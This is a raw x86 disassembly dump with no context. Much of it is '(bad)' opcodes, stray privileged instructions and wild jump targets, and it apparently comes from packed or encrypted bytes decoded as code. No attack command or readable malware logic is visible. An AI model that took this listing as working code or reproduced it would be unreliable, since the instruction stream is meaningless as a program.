  40ac93:	add    BYTE PTR [eax],bh
  40ac95:	sub    dh,BYTE PTR [esi-0x8]
  40ac98:	loope  0x40ac99
  40ac9a:	mov    cl,0xfd
  40ac9c:	(bad)  
  40ac9d:	cli    
  40ac9e:	sbb    eax,0x14fc576
  40aca3:	inc    esi
  40aca4:	mov    ah,0xfa
  40aca6:	or     eax,0x73eff58a
  40acab:	inc    esi
  40acac:	lods   eax,DWORD PTR ds:[esi]
  40acad:	dec    edi
  40acae:	xchg   ebx,eax
  40acaf:	add    DWORD PTR [esi+0x49eaf174],ebx
  40acb5:	cli    
  40acb6:	in     eax,dx
  40acb7:	sti    
  40acb8:	(bad)  
  40acb9:	je     0x40ac98
  40acbb:	push   esp
  40acbc:	xchg   ecx,eax
  40acbd:	es fdiv st(3),st
  40acc0:	jg     0x40ac4a
  40acc2:	sub    ebp,eax
  40acc4:	mov    ebx,0xe504c17c
  40acc9:	xor    ebp,DWORD PTR [edx+0x79]
  40accc:	push   ebp
  40accd:	push   DWORD PTR [edx+ebp*1]
  40acd0:	sar    edi,1
  40acd2:	call   0x343b41c1
  40acd7:	or     al,0x61
  40acd9:	stc    
  40acda:	outs   dx,BYTE PTR ds:[esi]
  40acdb:	sti    
  40acdc:	inc    edi
  40acdd:	cli    
  40acde:	adc    ebp,esp
  40ace0:	aas    
  40ace1:	je     0x40acc4
  40ace3:	jmp    0x40ac72
  40ace5:	or     DWORD PTR [ebp+0x79742ffb],0x9108adfb
  40acef:	dec    esi
  40acf0:	mov    dh,0xf9
  40acf2:	jne    0x40acef
  40acf4:	(bad)  
  40acf5:	in     al,dx
  40acf6:	ins    DWORD PTR es:[edi],dx
  40acf7:	jno    0x40acf9
	...
  40ad09:	add    BYTE PTR [eax],al
  40ad0b:	add    BYTE PTR [ecx-0x18],al
  40ad0e:	and    eax,0x5dfa0783
  40ad13:	jno    0x40ad1e
  40ad15:	jmp    0xfa383abe
  40ad1a:	dec    ebp
  40ad1b:	jno    0x40acfa
  40ad1d:	call   0xfa283ace
  40ad22:	cmp    eax,0xffe8d171
  40ad27:	hlt    
  40ad28:	(bad)  
  40ad29:	cli    
  40ad2a:	inc    BYTE PTR [eax-0x55]
  40ad2d:	sti    
  40ad2e:	(bad)  
  40ad2f:	es ret 0xfc74
  40ad33:	push   ds
  40ad34:	sub    BYTE PTR [esi+0x3f],cl
  40ad37:	test   al,0x3a
  40ad39:	jge    0x40acfe
  40ad3b:	in     eax,0xa2
  40ad3d:	xchg   edx,eax
  40ad3e:	sti    
  40ad3f:	push   es
  40ad40:	mov    ds:0x3ad9c1c8,al
  40ad45:	push   ebx
  40ad46:	mov    eax,DWORD PTR ds:0xee0065ee
  40ad4c:	or     DWORD PTR [eax],ecx
  40ad4e:	call   0xff3b5eed
  40ad53:	jb     0x40adb7
  40ad55:	dec    esi
  40ad56:	call   0x40c554
  40ad5b:	loop   0x40add7
  40ad5d:	ins    DWORD PTR es:[edi],dx
  40ad5e:	sbb    ebp,edx
  40ad60:	jg     0x40ada3
  40ad62:	jmp    0x40ad3f
  40ad64:	mov    edx,0x383d0d31
  40ad69:	xor    BYTE PTR [edi],0xe3
  40ad6c:	leave  
  40ad6d:	add    al,dh
  40ad6f:	jmp    0x40ad74
	...
  40ad84:	cmp    ah,ch
  40ad86:	add    DWORD PTR [edx-0x55c4b7c7],edx
  40ad8c:	scas   eax,DWORD PTR es:[edi]
  40ad8d:	out    0x8a,al
  40ad8f:	stos   BYTE PTR es:[edi],al
  40ad90:	pop    edi
  40ad92:	shr    ebp,0x3a
  40ad95:	push   ebx
  40ad96:	mov    ecx,DWORD PTR [ebp+0x1eb3bcb7]
  40ad9c:	adc    dh,BYTE PTR [esp+ecx*1-0x7f]
  40ada0:	fisttp WORD PTR [edx-0x3fc89902]
  40ada6:	je     0x40ad8c
  40ada8:	arpl   di,ax
  40adaa:	sar    ecx,0x3a
  40adad:	stc    
  40adae:	je     0x40ad8d
  40adb0:	loop   0x40ae2f
  40adb2:	stos   DWORD PTR es:[edi],eax
  40adb3:	add    BYTE PTR [edi-0xa],bh
  40adb6:	or     eax,eax
  40adb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adb9:	call   FWORD PTR [esi-0x37]
  40adbc:	and    cl,BYTE PTR ds:0x885ff00
  40adc2:	push   DWORD PTR [ebp-0x40]
  40adc5:	in     al,0x69
  40adc7:	sti    
  40adc8:	pop    ds
  40adc9:	test   BYTE PTR [ebx-0xb2afbb],0x75
  40add0:	mov    esp,fs
  40add2:	aas    
  40add3:	(bad)  
  40add4:	aas    
  40add5:	test   BYTE PTR [ecx],0xc0
  40add8:	(bad)  
  40add9:	js     0x40add5
  40addb:	add    ah,BYTE PTR [eax-0x638a0104]
  40ade1:	div    BYTE PTR [ebx-0x8]
  40ade4:	push   0xff92c1
	...
  40adf9:	add    BYTE PTR [eax],al
  40adfb:	add    BYTE PTR [edi+0xa],bl
  40adfe:	ror    BYTE PTR [edi],0xe4
  40ae01:	(bad)  
  40ae02:	add    BYTE PTR [eax],al
  40ae04:	pusha  
  40ae05:	test   DWORD PTR [ebx-0x14],eax
  40ae08:	jmp    0x40ae05
  40ae0a:	jle    0x40ae4b
  40ae0c:	push   eax
  40ae0d:	pop    es
  40ae0e:	test   cl,cl
  40ae10:	(bad)  
  40ae11:	cld    
  40ae12:	call   DWORD PTR [esi+0x78]
  40ae15:	dec    eax
  40ae16:	(bad)  
  40ae17:	call   FWORD PTR [edi-0x602fbc7c]
  40ae1d:	push   0x39f268d0
  40ae22:	inc    ecx
  40ae23:	add    BYTE PTR [eax+0x10005b17],bh
  40ae29:	push   esp
  40ae2a:	push   DWORD PTR [ebp-0x40]
  40ae2d:	fs (bad) 
  40ae2f:	aas    
  40ae30:	popa   
  40ae31:	cld    
  40ae32:	out    0x17,eax
  40ae34:	sub    edi,esp
  40ae36:	dec    DWORD PTR [edi-0x61]
  40ae39:	shr    BYTE PTR [bx+si+0x7a],1
  40ae3d:	cmp    DWORD PTR [ecx+0x0],eax
  40ae40:	cmp    DWORD PTR [ecx+0xb],eax
  40ae43:	pop    ebx
  40ae44:	cmp    ecx,ebp
  40ae46:	pop    esp
  40ae47:	pop    ecx
  40ae48:	xor    ch,BYTE PTR [ecx]
  40ae4a:	jo     0x40ae58
  40ae4c:	xor    bl,BYTE PTR [ebx]
  40ae4e:	jo     0x40ae58
  40ae50:	inc    edx
  40ae51:	and    BYTE PTR [ecx],cl
  40ae53:	test   DWORD PTR [ebx+ebp*8+0x2],ecx
  40ae57:	add    BYTE PTR [edx],dh
  40ae59:	xor    BYTE PTR [edi+0x9],ch
  40ae5c:	neg    BYTE PTR [esi+ebp*4+0x0]
	...
  40ae73:	add    BYTE PTR [ecx],bh
  40ae75:	jmp    0x1e77997c
  40ae7a:	aas    
  40ae7b:	mov    ah,0x39
  40ae7d:	jmp    0xbaddae84
  40ae82:	ret    0x96b8
  40ae85:	out    dx,al
  40ae86:	idiv   esi
  40ae88:	mov    esi,DWORD PTR [edi]
  40ae8a:	cmp    al,0x7
  40ae8c:	or     al,0xe9
  40ae8e:	mov    edi,0x2e99144
  40ae93:	add    BYTE PTR [ecx],bh
  40ae95:	imul   edi,DWORD PTR [eax],0x4c5d3e00
  40ae9b:	add    bh,BYTE PTR [ecx]
  40ae9d:	jmp    0xb7bf96f1
  40aea2:	idiv   esi
  40aea4:	shl    BYTE PTR [eax+ecx*8],0x82
  40aea8:	int3   
  40aea9:	rol    BYTE PTR [edx],0x75
  40aeac:	sbb    BYTE PTR [ecx],dl
  40aeae:	(bad)  
  40aeaf:	sub    edi,eax
  40aeb1:	call   0x814623ad
  40aeb6:	test   eax,0xbe93959
  40aebb:	shl    BYTE PTR [esi],0x64
  40aebe:	push   es
  40aebf:	add    bh,BYTE PTR [ecx]
  40aec1:	jmp    0xe861f385
  40aec6:	add    al,BYTE PTR [eax]
  40aec8:	cmp    DWORD PTR [eax+0x390201],eax
  40aece:	jmp    0xe8292c57
  40aed3:	outs   dx,BYTE PTR ds:[esi]
  40aed4:	inc    esi
  40aed5:	mov    ebx,edx
  40aed7:	fild   WORD PTR [eax]
	...
  40aee9:	add    BYTE PTR [eax],al
  40aeeb:	add    bh,dh
  40aeed:	cmp    al,0x41
  40aeef:	add    eax,0xeae90039
  40aef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aef5:	add    cl,ch
  40aef7:	add    edi,DWORD PTR [edx+0x44054174]
  40aefd:	pop    es
  40aefe:	pusha  
  40aeff:	jbe    0x40aeda
  40af01:	mov    esi,0x3bebab
  40af06:	jmp    0xe7e14f0e
  40af0b:	add    edi,DWORD PTR [ecx]
  40af0d:	or     DWORD PTR [ebx-0x992c415],0xffffff8a
  40af14:	sbb    eax,0xa13e25d4
  40af19:	sti    
  40af1a:	call   0x5d29e822
  40af1f:	add    bh,BYTE PTR [ecx]
  40af21:	add    BYTE PTR [edx+0x79],ch
  40af24:	xchg   ecx,eax
  40af25:	sti    
  40af26:	push   ebx
  40af27:	pop    es
  40af28:	shl    BYTE PTR [ecx+esi*4-0x41],0xf5
  40af2d:	out    0xe3,eax
  40af2f:	add    edi,DWORD PTR [ecx]
  40af31:	add    al,dl
  40af33:	outs   dx,DWORD PTR ds:[esi]
  40af34:	cmp    BYTE PTR [eax],al
  40af36:	jmp    0xec2884bd
  40af3b:	push   es
  40af3c:	mov    ah,0x5f
  40af3e:	call   0x23c9e846
  40af43:	sar    BYTE PTR [ebx-0x52fbaa8c],1
  40af49:	pop    es
  40af4a:	scas   al,BYTE PTR es:[edi]
  40af4b:	inc    ecx
  40af4c:	and    DWORD PTR [ebx],eax
  40af4e:	jmp    0x40af56
	...
  40af63:	add    BYTE PTR [ecx],bh
  40af65:	jmp    0xe8b66e57
  40af6a:	out    0x3,al
  40af6c:	cmp    DWORD PTR [eax],eax
  40af6e:	add    BYTE PTR [esi-0x17003f88],ch
  40af74:	cmp    al,BYTE PTR [eax]
  40af76:	(bad)  
  40af77:	lods   al,BYTE PTR ds:[esi]
  40af78:	repnz cmc 
  40af7a:	(bad)  
  40af7b:	jmp    0x2d856cba
  40af80:	xor    eax,0xa7e90000
  40af85:	cmp    al,0xbc
  40af87:	jmp    0x2640afc6
  40af8c:	js     0x40af46
  40af8e:	(bad)  
  40af8f:	call   0xb53fafce
  40af94:	out    0xdd,al
  40af96:	adc    ah,BYTE PTR [edi]
  40af98:	(bad)  
  40af99:	test   BYTE PTR [eax+0x74f67aa4],0x35
  40afa0:	popf   
  40afa1:	std    
  40afa2:	std    
  40afa3:	push   cs
  40afa4:	scas   al,BYTE PTR es:[edi]
  40afa5:	mov    BYTE PTR [ecx+esi*1-0x5a],al
  40afa9:	ins    BYTE PTR es:[edi],dx
  40afaa:	aam    0x11
  40afac:	nop
  40afad:	hlt    
  40afae:	(bad)  
  40afaf:	idiv   BYTE PTR [ebp+0x406ac43c]
  40afb5:	pop    esi
  40afb6:	aas    
  40afb7:	sub    BYTE PTR ds:0xe53b7500,dh
  40afbd:	push   eax
  40afbe:	inc    eax
  40afbf:	sub    BYTE PTR ds:0x3d300ce8,dh
  40afc5:	add    BYTE PTR [eax+0x51],dl
	...
  40afdc:	or     al,BYTE PTR [eax+0x41]
  40afdf:	jmp    0xc2011c33
  40afe4:	xchg   edi,eax
  40afe5:	push   edi
  40afe6:	add    cl,ch
  40afe8:	xor    eax,eax
  40afea:	jae    0x40afed
  40afec:	int    0x59
  40afee:	inc    eax
  40afef:	sub    BYTE PTR ds:0x3531f0e8,bh
  40aff5:	add    BYTE PTR [eax+0x1],dl
  40aff8:	add    DWORD PTR [eax+0x41],0x0
  40affc:	adc    dh,ch
  40affe:	jae    0x40afc0
  40b000:	test   al,0x91
  40b002:	pop    eax
  40b003:	add    BYTE PTR [eax],ah
  40b005:	or     al,al
  40b007:	je     0x40afcb
  40b009:	push   0xd14062
  40b00e:	call   0x41a8e8
  40b013:	push   eax
  40b014:	clc    
  40b015:	pop    esi
  40b016:	inc    eax
  40b017:	inc    ecx
  40b018:	shr    ch,1
  40b01a:	jae    0x40afdc
  40b01c:	mov    BYTE PTR [esi+0x5a],ah
  40b01f:	add    al,ah
  40b021:	jmp    0x413c183c
  40b026:	inc    ecx
  40b027:	add    BYTE PTR [eax-0x46],bh
  40b02a:	push   esi
  40b02b:	add    al,dl
  40b02d:	push   eax
  40b02e:	push   0x3be06b
  40b033:	dec    ebp
  40b035:	shl    dh,0x5d
  40b038:	jmp    0x6270:0x500b0000
  40b03f:	inc    DWORD PTR [eax]
	...
  40b051:	add    BYTE PTR [eax],al
  40b053:	add    BYTE PTR ds:0xa8a1e6c9,cl
  40b059:	add    BYTE PTR [eax],al
  40b05b:	push   eax
  40b05c:	xchg   edi,eax
  40b05d:	fs enter 0x26e8,0xfa
  40b062:	std    
  40b063:	(bad)  
  40b064:	jmp    0xe406c9d
  40b069:	shl    dh,0x8d
  40b06c:	sub    ah,bh
  40b06e:	dec    DWORD PTR [edi+0x77]
  40b071:	fs (bad) 
  40b073:	call   0x3ea6d2
  40b078:	fnstenv [eax+edi*4]
  40b07b:	adc    DWORD PTR ds:0x5c73febc,0x7f
  40b082:	jnp    0x40b03c
  40b084:	and    BYTE PTR [esi+ebp*1+0x68],ah
  40b088:	cmp    ecx,ebp
  40b08a:	add    ch,bh
  40b08c:	out    0x82,eax
  40b08e:	outs   dx,BYTE PTR ds:[esi]
  40b08f:	or     BYTE PTR [ecx],dl
  40b091:	lea    eax,[eax+0x6f7316fe]
  40b097:	ror    BYTE PTR [esi],0xf5
  40b09a:	or     ch,al
  40b09c:	jge    0x40b0fb
  40b09e:	cmc    
  40b09f:	(bad)  
  40b0a0:	(bad)  
  40b0a1:	aam    0xb6
  40b0a3:	(bad)  
  40b0a4:	ins    BYTE PTR es:[edi],dx
  40b0a5:	icebp  
  40b0a6:	jmp    0x6cfe:0xf54ab538
  40b0ad:	xchg   ecx,eax
  40b0ae:	hlt    
  40b0af:	je     0x40b0e2
  40b0b1:	push   ecx
  40b0b2:	es test dh,dl
  40b0b5:	xor    dh,ch
  40b0b7:	je     0x40b0b9
	...
  40b0c9:	add    BYTE PTR [eax],al
  40b0cb:	add    cl,bh
  40b0cd:	inc    ecx
  40b0ce:	cmp    DWORD PTR [edi+0x74f522c6],eax
  40b0d4:	icebp  
  40b0d5:	adc    DWORD PTR [ecx],esi
  40b0d7:	xchg   DWORD PTR [esi+0x7574f512],esi
  40b0dd:	add    DWORD PTR [ecx],ebp
  40b0df:	xchg   DWORD PTR [esi-0x228b0afe],esp
  40b0e5:	adc    DWORD PTR [ecx],esp
  40b0e7:	xchg   DWORD PTR [esi-0x2e8b0c0e],edx
  40b0ed:	add    DWORD PTR [ecx],ebx
  40b0ef:	xchg   DWORD PTR [esi-0x45f3181e],eax
  40b0f5:	pop    esp
  40b0f6:	in     al,dx
  40b0f7:	add    eax,0x44bbd9ec
  40b0fc:	popa   
  40b0fd:	out    0x2,eax
  40b0ff:	add    BYTE PTR [ecx],bh
  40b101:	data16 jbe 0x40b0ec
  40b104:	cmp    DWORD PTR ds:0x56b6834,esi
  40b10a:	inc    ebx
  40b10b:	add    BYTE PTR [esi+0x34],cl
  40b10e:	enter  0x8ee7,0x11
  40b112:	add    al,0x0
  40b114:	xor    al,BYTE PTR [eax]
  40b116:	test   eax,0x23bb3e6e
  40b11b:	in     al,dx
  40b11c:	cmp    DWORD PTR [eax],eax
  40b11e:	jmp    0x29844226
  40b123:	inc    ebx
  40b124:	cmp    ebx,esi
  40b126:	sti    
  40b127:	(bad)  
  40b128:	push   ds
  40b129:	xchg   ebx,eax
  40b12a:	and    BYTE PTR [ecx+edi*1],al
  40b12d:	pop    es
  40b12e:	test   eax,0x6e
	...
  40b143:	add    BYTE PTR [esi],bh
  40b145:	mov    ebx,0x38ec23
  40b14a:	jmp    0x2dada752
  40b14f:	jmp    0x40b14d
  40b151:	jns    0x40b1a8
  40b153:	hlt    
  40b154:	loop   0x40b184
  40b156:	sub    DWORD PTR [edx-0xbba0d21],edi
  40b15c:	enter  0xa1,0xfd
  40b160:	aas    
  40b161:	jge    0x40b0e7
  40b163:	test   bh,0xf2
  40b166:	sub    eax,0x5ce7e96e
  40b16b:	jge    0x40b124
  40b16d:	repnz sbb eax,0x44e79d6e
  40b173:	jge    0x40b11c
  40b175:	repnz pop ebx
  40b177:	ds test eax,0xc2d1114f
  40b17d:	repnz std 
  40b17f:	jmp    0xc8e7:0xf3f5f93f
  40b186:	sub    dl,BYTE PTR [ebx]
  40b188:	cmp    DWORD PTR [ebp+0x72],ecx
  40b18b:	loopne 0x40b146
  40b18d:	mov    ebx,0xf26ff294
  40b192:	lods   eax,DWORD PTR ds:[esi]
  40b193:	mov    DWORD PTR [esi+0x5ef3cdf1],ebp
  40b199:	bnd call 0xd57d73a2
  40b19f:	dec    BYTE PTR [esi-0x4513ff95]
  40b1a5:	sub    al,BYTE PTR [eax]
  40b1a7:	xor    al,0x0
	...
  40b1b9:	add    BYTE PTR [eax],al
  40b1bb:	add    BYTE PTR [eax],dh
  40b1bd:	jmp    0x7b9ab6
  40b1c2:	call   DWORD PTR [ecx+edx*2]
  40b1c5:	call   0xf36b2a27
  40b1ca:	or     ch,BYTE PTR [ecx-0x6197fe60]
  40b1d0:	pop    ecx
  40b1d1:	aas    
  40b1d2:	add    BYTE PTR [esi-0x70],bh
  40b1d5:	or     al,0xe8
  40b1d7:	jb     0x40b15d
  40b1d9:	repnz inc BYTE PTR [edx+0x15dc6838]
  40b1e0:	jl     0x40b1e2
  40b1e2:	call   esp
  40b1e4:	inc    esi
  40b1e5:	call   0xf32b12d5
  40b1ea:	mov    BYTE PTR [ebp+ecx*4-0xd],ah
  40b1ee:	inc    BYTE PTR [esi+0x75]
  40b1f1:	xor    al,BYTE PTR [ecx]
  40b1f3:	jmp    0x2bc53532
  40b1f8:	retf   
  40b1f9:	repnz (bad) 
  40b1fb:	cdq    
  40b1fc:	loop   0x40b25b
  40b1fe:	xchg   BYTE PTR [esi],ah
  40b200:	stos   BYTE PTR es:[edi],al
  40b201:	test   BYTE PTR [ebx+ebp*1-0x46010d55],al
  40b208:	stos   DWORD PTR es:[edi],eax
  40b209:	lods   al,BYTE PTR ds:[esi]
  40b20a:	mov    bh,0xf
  40b20c:	stos   BYTE PTR es:[edi],al
  40b20d:	repnz out 0x49,eax
  40b210:	repnz (bad) 
  40b212:	jmp    FWORD PTR [edi-0x40]
  40b215:	mov    ch,0xfd
  40b217:	test   BYTE PTR [ebx-0x5d9af0cf],0x0
  40b21e:	add    cl,ch
	...
  40b234:	mov    ecx,0x6bdfc18c
  40b239:	repnz imul bl
  40b23c:	dec    edx
  40b23d:	add    BYTE PTR [eax],al
  40b23f:	jmp    0xc32e7f
  40b244:	pusha  
  40b245:	std    
  40b246:	dec    DWORD PTR [edx+eiz*1-0x5d97afe0]
  40b24d:	adc    DWORD PTR [ecx+0x0],eax
  40b250:	js     0x40b2b6
  40b252:	push   edi
  40b253:	add    BYTE PTR [eax],ah
  40b255:	repnz mov esi,0x47d41575
  40b25b:	add    DWORD PTR [eax],edx
  40b25d:	std    
  40b25e:	mov    WORD PTR [ebp-0x2112e],ss
  40b264:	lea    edi,[ebx]
  40b266:	sub    al,0x50
  40b268:	sub    al,bl
  40b26a:	sub    al,BYTE PTR [ecx+0x10]
  40b26d:	aad    0x5a
  40b26f:	push   edi
  40b270:	adc    ch,bh
  40b272:	or     al,al
  40b274:	adc    eax,0xe12ce908
  40b279:	cld    
  40b27a:	(bad)  
  40b27b:	inc    BYTE PTR ds:0x60bae809
  40b281:	out    dx,al
  40b282:	std    
  40b283:	or     esp,DWORD PTR [eax]
  40b285:	js     0x40b296
  40b287:	push   0x411576
  40b28c:	vmread DWORD PTR [eax+ebp*8],edx
  40b290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b291:	jae    0x40b291
  40b293:	dec    DWORD PTR [ebx-0xd]
  40b296:	push   0x0
	...
  40b2ab:	add    BYTE PTR [edi+0x78],cl
  40b2ae:	adc    al,0xe8
  40b2b0:	(bad)  [ebx-0x2]
  40b2b3:	(bad)  
  40b2b4:	std    
  40b2b5:	xchg   edi,eax
  40b2b6:	sar    dh,0x3f
  40b2b9:	out    dx,al
  40b2ba:	mov    edx,DWORD PTR [edx+0x7c]
  40b2bd:	dec    edx
  40b2be:	push   eax
  40b2bf:	call   0x3f26e3
  40b2c4:	mov    al,ds:0x7075ff4c
  40b2c9:	out    dx,eax
  40b2ca:	jae    0x40b2d8
  40b2cc:	(bad)
  40b2d0:	cmp    esi,edx
  40b2d2:	icebp  
  40b2d3:	(bad)  
  40b2d4:	pop    esi
  40b2d5:	mov    esi,0xb9568488
  40b2da:	fcmovu st,st(4)
  40b2dc:	cmp    edi,esp
  40b2de:	add    cl,BYTE PTR [ebp-0x7b850505]
  40b2e4:	test   DWORD PTR [eax-0x7b5e0110],esp
  40b2ea:	xor    BYTE PTR [ecx+0x39],al
  40b2ed:	mov    ?,WORD PTR [esi-0xf68d84d]
  40b2f3:	out    0x34,eax
  40b2f5:	xor    DWORD PTR [eax+eax*1],eax
  40b2f8:	inc    edx
  40b2f9:	cdq    
  40b2fa:	ja     0x40b32a
  40b2fc:	mov    eax,ds:0x39411b87
  40b301:	jbe    0x40b37a
  40b303:	adc    al,0x11
  40b305:	ja     0x40b383
  40b307:	(bad)  
  40b308:	mul    BYTE PTR [esi-0x49]
  40b30b:	mov    bl,0xef
  40b30d:	dec    esi
  40b30e:	icebp  
  40b30f:	dec    edi
	...
  40b324:	rcl    DWORD PTR [esi],1
  40b326:	jnp    0x40b326
  40b328:	fisubr WORD PTR [ecx+0x462974ef]
  40b32e:	ja     0x40b33c
  40b330:	imul   ebp,DWORD PTR [esi],0x36d10877
  40b336:	in     al,dx
  40b337:	(bad)  
  40b338:	mov    esi,0xb6853941
  40b33d:	es icebp 
  40b33f:	mov    ah,0xe5
  40b341:	psllw  mm7,mm6
  40b344:	xchg   ecx,eax
  40b345:	leave  
  40b346:	pop    eax
  40b347:	add    BYTE PTR [ecx],bh
  40b349:	pop    edx
  40b34a:	in     al,dx
  40b34b:	add    DWORD PTR [ebx],ecx
  40b34d:	int    0x7b
  40b34f:	xchg   esp,eax
  40b350:	(bad)
  40b353:	(bad)  
  40b354:	cmp    cl,BYTE PTR [ecx]
  40b356:	test   ecx,ebp
  40b358:	cmp    eax,DWORD PTR [edi+0x273981]
  40b35e:	pop    edx
  40b35f:	ja     0x40b39c
  40b361:	fld    TBYTE PTR [eax]
  40b363:	pop    esp
  40b364:	xchg   ebp,eax
  40b365:	das    
  40b366:	sub    BYTE PTR [esi+ebx*2],al
  40b369:	mov    ch,0x94
  40b36b:	icebp  
  40b36c:	push   edi
  40b36d:	out    dx,eax
  40b36e:	rcl    BYTE PTR [eax+0x53e8ffe7],1
  40b374:	shl    DWORD PTR [edi-0x10c6bd0b],1
  40b37a:	jae    0x40b333
  40b37c:	xor    al,0xef
  40b37e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b37f:	fstp   TBYTE PTR [esi+edx*2+0x588903e9]
  40b386:	lods   al,BYTE PTR ds:[esi]
  40b387:	xor    BYTE PTR [eax],al
	...
  40b399:	add    BYTE PTR [eax],al
  40b39b:	add    BYTE PTR [eax+0x0],bh
  40b39e:	mov    ?,WORD PTR [esi-0xf7a1236]
  40b3a4:	push   ss
  40b3a5:	ins    DWORD PTR es:[edi],dx
  40b3a6:	push   ss
  40b3a7:	add    al,0x39
  40b3a9:	dec    edx
  40b3aa:	adc    ch,bh
  40b3ac:	mov    esi,0x8fce174
  40b3b1:	jne    0x40b3a0
  40b3b3:	cld    
  40b3b4:	add    DWORD PTR [edi+ecx*1+0x5c],esi
  40b3b8:	fist   WORD PTR [edi]
  40b3ba:	test   al,0x3
  40b3bc:	fidiv  WORD PTR [ebp+esi*8-0x25]
  40b3c0:	pop    ebp
  40b3c1:	js     0x40b408
  40b3c3:	lock iret 
  40b3c5:	mov    ah,0x74
  40b3c7:	icebp  
  40b3c8:	(bad)  
  40b3c9:	out    dx,al
  40b3ca:	cwde   
  40b3cb:	fisttp DWORD PTR [ebp+0x6f02d77]
  40b3d1:	out    dx,eax
  40b3d2:	fwait
  40b3d3:	adc    ebp,DWORD PTR [esi-0x59ac128c]
  40b3d9:	je     0x40b3bc
  40b3db:	fstp   TBYTE PTR [edx-0x17]
  40b3de:	or     eax,0x6ca49ef0
  40b3e3:	lock (bad) 
  40b3e5:	jl     0x40b44a
  40b3e7:	lds    eax,FWORD PTR [esi+ebp*8-0x11140a01]
  40b3ee:	mov    ah,0x2d
  40b3f0:	push   0x42d1feed
  40b3f5:	push   esi
  40b3f6:	add    cl,ch
  40b3f8:	mov    cl,0xae
  40b3fa:	push   cs
  40b3fb:	ins    BYTE PTR es:[edi],dx
  40b3fc:	loope  0x40b3eb
  40b3fe:	dec    dh
	...
  40b414:	data16 mov bl,0xbb
  40b417:	(bad)  
  40b418:	pop    esi
  40b419:	in     eax,dx
  40b41a:	out    0xef,eax
  40b41c:	in     al,dx
  40b41d:	(bad)  
  40b41e:	push   DWORD PTR [ebp-0x51024980]
  40b424:	es out 0x74,al
  40b427:	ins    DWORD PTR es:[edi],dx
  40b428:	push   ds
  40b429:	out    dx,eax
  40b42a:	enter  0x4dab,0x0
  40b42e:	push   ebp
  40b42f:	bound  ebx,QWORD PTR [ecx]
  40b431:	out    dx,eax
  40b432:	je     0x40b411
  40b434:	daa    
  40b435:	jne    0x40b447
  40b437:	xchg   BYTE PTR [eax+0x2f4fefc],dl
  40b43d:	out    0xc3,al
  40b43f:	je     0x40b44f
  40b441:	out    dx,eax
  40b442:	enter  0x39ab,0x0
  40b446:	push   ebp
  40b447:	jb     0x40b422
  40b449:	add    bl,0x59
  40b44c:	mov    gs,ebp
  40b44e:	je     0x40b435
  40b450:	add    ah,BYTE PTR [ecx+ecx*4+0x4e]
  40b454:	out    0xfa,al
  40b456:	mov    edi,0xc94d41bc
  40b45b:	sub    edi,DWORD PTR [ecx]
  40b45d:	add    bh,bh
  40b45f:	mov    esp,0x6054d82a
  40b464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b465:	out    dx,al
  40b466:	or     ch,BYTE PTR [ecx]
  40b468:	xor    BYTE PTR [ebx],al
  40b46a:	pop    edi
  40b46b:	xor    BYTE PTR [ebx-0x7],bh
  40b46e:	call   DWORD PTR ds:0xf0e7fc20
  40b474:	pop    ss
  40b475:	out    dx,al
  40b476:	inc    BYTE PTR [eax]
	...
  40b48c:	mov    eax,ecx
  40b48e:	jae    0x40b49f
  40b490:	test   al,0xe3
  40b492:	es inc ecx
  40b494:	nop
  40b495:	fidiv  WORD PTR [ebx+0xc]
  40b498:	cmp    BYTE PTR [esi-0x35a8007b],dh
  40b49e:	or     BYTE PTR [edx+0x50],ch
  40b4a1:	fidiv  WORD PTR [ebx+0xc]
  40b4a4:	js     0x40b42d
  40b4a6:	test   edi,edi
  40b4a8:	xchg   DWORD PTR [esp+eax*2-0xc],ebp
  40b4ac:	call   0x5081f3fe
  40b4b1:	fidiv  WORD PTR [ebx-0xc]
  40b4b4:	js     0x40b52d
  40b4b6:	test   edi,edi
  40b4b8:	out    0x6b,eax
  40b4ba:	inc    esp
  40b4bb:	clc    
  40b4bc:	dec    eax
  40b4bd:	retf   0xfb
  40b4c0:	adc    cl,cl
  40b4c2:	add    eax,DWORD PTR [edi+eax*8-0x3bba7823]
  40b4c9:	dec    eax
  40b4ca:	add    BYTE PTR [eax],dl
  40b4cc:	and    BYTE PTR [ecx],al
  40b4ce:	call   0xfe1f48cb
  40b4d3:	mov    DWORD PTR [ebp-0xc],ecx
  40b4d6:	std    
  40b4d7:	jne    0x40b541
  40b4d9:	leave  
  40b4da:	test   al,0x88
  40b4dc:	push   edi
  40b4dd:	fimul  WORD PTR [ecx]
  40b4df:	rcl    bh,0x84
  40b4e2:	mov    ebx,0xff00d000
  40b4e7:	jne    0x40b551
  40b4e9:	dec    ecx
  40b4ea:	call   0xff4195ec
  40b4ef:	jne    0x40b4f1
	...
  40b501:	add    BYTE PTR [eax],al
  40b503:	add    BYTE PTR [ecx+ecx*8],al
  40b506:	adc    BYTE PTR [ebp-0x30],0x0
  40b50a:	cmp    eax,0xffffffa2
  40b50d:	in     eax,dx
  40b50e:	test   BYTE PTR [eax+eiz*4-0x3a750000],ah
  40b515:	fdivr  QWORD PTR [esi+0x3f]
  40b518:	cmp    edi,edx
  40b51a:	std    
  40b51b:	xor    DWORD PTR [ecx+0x210002d6],0xffffff82
  40b522:	sub    eax,0xda963941
  40b527:	cmp    edi,esp
  40b529:	(bad)  
  40b52a:	add    cl,BYTE PTR [ebx]
  40b52c:	jns    0x40b5a0
  40b52e:	jbe    0x40b52f
  40b530:	in     al,0xde
  40b532:	pop    ebx
  40b533:	push   DWORD PTR [esi]
  40b535:	xlat   BYTE PTR ds:[ebx]
  40b536:	add    bh,bh
  40b538:	in     al,0xc6
  40b53a:	pop    ebx
  40b53b:	call   0x6844cd61
  40b540:	mov    edi,0xee004305
  40b545:	into   
  40b546:	xor    dl,BYTE PTR [ebp+0x39]
  40b549:	xlat   BYTE PTR ds:[ebx]
  40b54a:	idiv   DWORD PTR [edi+0x74ed11ad]
  40b550:	xor    DWORD PTR [eax],edx
  40b552:	add    ebp,DWORD PTR [eax-0x46]
  40b555:	retf   0x41
  40b558:	xchg   BYTE PTR [ecx-0x26c6aaca],al
  40b55e:	jg     0x40b557
  40b560:	cmp    ah,ch
  40b562:	xor    eax,0xed698cff
  40b567:	je     0x40b569
	...
  40b579:	add    BYTE PTR [eax],al
  40b57b:	add    BYTE PTR ds:0xf685e982,al
